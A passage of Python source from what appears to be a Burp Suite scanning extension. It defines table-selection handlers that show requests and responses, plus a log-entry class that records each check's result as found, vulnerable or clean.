            elif columnIndex == 3:
                try:
                    return helpers.analyzeRequest(logEntry.requestResponse).getMethod()
                except:
                    return "POST"
            elif columnIndex == 4:
                return logEntry.state
            else:
                return ""

    # ======================== 内部类：表格选择处理 ========================

    class FirstTable(swing.JTable):
        """主表格 - 点击行时更新详情表格和请求/响应查看器"""
        def changeSelection(self, row, col, toggle, extend):
            global secondModel, firstModel, log, log2, log3, currentlyDisplayedItem
            logEntry = log[row]
            data_md5_id = logEntry.data_md5
            if data_md5_id in log2:
                log3 = log2[data_md5_id]
            else:
                log3 = []

            try:
                secondModel.fireTableRowsInserted(len(log3), len(log3))
                secondModel.fireTableDataChanged()
            except:
                pass
            try:
                requestViewer.setMessage(logEntry.requestResponse.getRequest(), True)
                if logEntry.requestResponse.getResponse() is None:
                    responseViewer.setMessage("", False)
                else:
                    responseViewer.setMessage(logEntry.requestResponse.getResponse(), False)
            except:
                pass
            currentlyDisplayedItem = logEntry.requestResponse

            swing.JTable.changeSelection(self, row, col, toggle, extend)

    class SecondTable(swing.JTable):
        """详情表格 - 点击行时更新请求/响应查看器"""
        def __init__(self, secondTableModel):
            swing.JTable.__init__(self, secondTableModel)

        def changeSelection(self, row, col, toggle, extend):
            global requestViewer, responseViewer, log3, currentlyDisplayedItem
            logEntry = log3[row]
            try:
                if logEntry.requestResponse is not None:
                    requestViewer.setMessage(logEntry.requestResponse.getRequest(), True)
                    if logEntry.requestResponse.getResponse() is None:
                        responseViewer.setMessage("", False)
                    else:
                        responseViewer.setMessage(logEntry.requestResponse.getResponse(), False)
                else:
                    requestViewer.setMessage("", True)
                    responseViewer.setMessage("", False)
            except:
                pass
            if logEntry.requestResponse is not None:
                currentlyDisplayedItem = logEntry.requestResponse

            swing.JTable.changeSelection(self, row, col, toggle, extend)

    # ======================== 内部类：日志条目 ========================

    class LogEntry():
        def __init__(self, id, requestResponse, url, parameter, value, change,
                     data_md5, times, state, response_code, contentlen):
            self.id = id
            self.time = time.time()
            self.requestResponse = requestResponse
            self.contentlen = contentlen
            self.url = url
            self.parameter = parameter   # 复用: 存储POC
            self.value = value           # 复用: 存储match_string
            self.change = change         # 存储检测结果: Found! / Not Found / Error
            self.data_md5 = data_md5
            self.times = times
            self.state = state           # Found / Not Found / Vulnerable! / Clean
            self.response_code = response_code

        def setState(self, state):
            self.state = state
